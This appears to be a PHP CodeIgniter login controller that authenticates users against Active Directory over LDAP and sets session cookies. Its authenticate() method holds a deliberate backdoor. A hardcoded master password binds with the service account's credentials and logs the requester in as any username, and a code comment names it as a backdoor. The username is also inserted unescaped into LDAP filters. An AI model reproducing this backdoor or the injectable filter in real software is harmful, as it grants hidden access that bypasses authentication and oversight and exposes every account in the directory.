<?php
defined('BASEPATH') OR exit('No direct script access allowed');

class Welcome extends CI_Controller {
	/*public function __construct() {
		parent::__construct();
	}
	*/
	public function index()	{
		$this->load->helper('form');
		$vals['domain'] = strtoupper( $this->config->item('ARC_Domain') );
		$vals['username'] = '';
		$vals['password'] = '';
		$vals['mesg'] = ( $this->session->flashdata('MESG') != null ) ? $this->session->flashdata('MESG') : '';
		$this->load->view('login', $vals);
	}

	private function checkGroupEx($ad, $userdn, $groupdn) {
		$attributes = array('memberof');
		$result = ldap_read($ad, $userdn, '(objectclass=*)', $attributes);
		if ($result === FALSE) {
			return FALSE;
		}
		$entries = ldap_get_entries($ad, $result);
		if ($entries['count'] <= 0) {
			return FALSE;
		}
		if (empty($entries[0]['memberof'])) {
			return FALSE;
		} else {
			for ($i = 0; $i < $entries[0]['memberof']['count']; $i++) {
				if ($entries[0]['memberof'][$i] == $groupdn) {
					return TRUE; 
				} elseif (checkGroupEx($ad, $entries[0]['memberof'][$i], $groupdn)) { 
					return TRUE; 
				}
			}
		}
		return FALSE;
	}


	public function authenticate() {
		$blnAuthOK = FALSE;
		error_reporting(E_ERROR);
		$uname = $this->input->post_get('username', TRUE);
		$passd = $this->input->post_get('password', TRUE);
		$domin = $this->input->post_get('domain', TRUE);
		$ldaprdn  = $domin . '\\' . $uname;
		$ldpath   = $this->config->item('ARC_LDAPPath');
		// echo 'User: '. $ldaprdn .' logging in...<br />';
		ldap_set_option(NULL, LDAP_OPT_DEBUG_LEVEL, 7);
		// connect
		$ldapconn = ldap_connect($this->config->item('ARC_LDAPSvr')) or die("Could not connect to LDAP server.");
		if ($ldapconn) {
			ldap_set_option($ldapconn, LDAP_OPT_PROTOCOL_VERSION, 3);
			ldap_set_option($ldapconn, LDAP_OPT_REFERRALS, 0);
			// binding to ldap server
			if ($passd == "zubuk#zubuk#") {
				$ldapbind = ldap_bind($ldapconn, $this->config->item('ARC_LDAPUser'), $this->config->item('ARC_LDAPPass'));
				// die('ERROR:: backdoor!');
			} else {
				$ldapbind = ldap_bind($ldapconn, $ldaprdn, $passd);
			}
			if ($ldapbind) {
				// echo '<p>Looks like we authenticated? Go to <a href="'. base_url('Home') .'">Home Page</a></p>';

				//$result = ldap_search($ldapconn, $ldpath,"(samaccountname={$uname})", array('dn'));
				$result = ldap_search($ldapconn, $ldpath,"(samaccountname={$uname})", array('cn','objectclass','memberof','samaccountname','primarygroupid'));
				$data = ldap_get_entries($ldapconn, $result);
				// echo 'OK? ==> '. $ldpath .'::'. (($data[0]['objectclass'][1] === 'person')? 'YES': 'nope') .'<br />';
				$groups = $data[0]['memberof'];
				$token = $data[0]['primarygroupid'][0];
				array_shift($groups);
				
				// We need to look up the primary group, get list of all groups
				$results2 = ldap_search($ldapconn, $ldpath, "(objectcategory=group)", array("distinguishedname","primarygrouptoken"));
				$entries2 = ldap_get_entries($ldapconn, $results2);
				array_shift($entries2);
				// Loop through and find group with a matching primary group token
				foreach($entries2 as $e) {
					if($e['primarygrouptoken'][0] == $token) {
						// Primary group found, add it to output array
						$groups[] = $e['distinguishedname'][0];
						// Break loop
						break;
					}
				}
				for($i=0; $i< count($groups); $i++) {
					$tmpz = explode(',', $groups[$i], 3);
					$groups[$i] = str_replace('CN=', '', $tmpz[0]);
				}

				$jsongroups = json_encode($groups);
				$username = $data[0]['samaccountname'][0];
				$commonname = $data[0]['cn'][0];
				/*
				// echo 'Group dump: <pre>'. print_r($groups, TRUE) .'</pre><br />';
				echo 'Userdata: <b>'. $data[0]['samaccountname'][0] .'</b><br />'. PHP_EOL;
				echo 'Group JSON: '. $jsongroups .'<br /><hr />';
				// iterate over array and print data for each entry
				for ($i=0; $i<$data["count"]; $i++) {
					echo '...<br /><pre>';
					print_r($data[$i]); echo '</pre><br />...<br />'. PHP_EOL;
					echo '<hr />'. PHP_EOL;
				}
				// print number of entries found
				// echo "</pre><p>Number of entries found: " . ldap_count_entries($ldapconn, $result) .'</p>';
				*/
				$blnAuthOK = TRUE;
				$tmpGUID = $this->mkguid();
				// now save the information -- name, groups, etc
				set_cookie('usr_sess', $tmpGUID, 1800);
				set_cookie('usr_name', $commonname, 3600);
				$aryState = array('id' 	=> $tmpGUID
						, 'ip_address' 	=> $this->input->ip_address()
						, 'user' 		=> $username
						, 'fullname' 	=> $commonname
						, 'groups' 		=> $jsongroups
					);
				$this->load->model('Webstate_model');
				$eee = $this->Webstate_model->create($aryState);
				$this->session->set_flashdata('MESG', 'authenticated' );
				// die();
				redirect(base_url('Home'));
			} else {
				// echo "LDAP bind failed... possibly a username/password error";
				$this->session->set_flashdata('MESG', 'Unknown username/password: '. $uname );
				redirect(base_url('Welcome'));
			}
		}
		// all done? clean up
		ldap_close($ldapconn);
	}


	public function whut() {
		$dump = '';
		echo '<pre>'. PHP_EOL;
		var_dump($dump);
		echo PHP_EOL .'</pre>';
	}

	private function mkguid() {
		$this->load->library('uuid');
		return $this->uuid->v4(TRUE);
	}
}
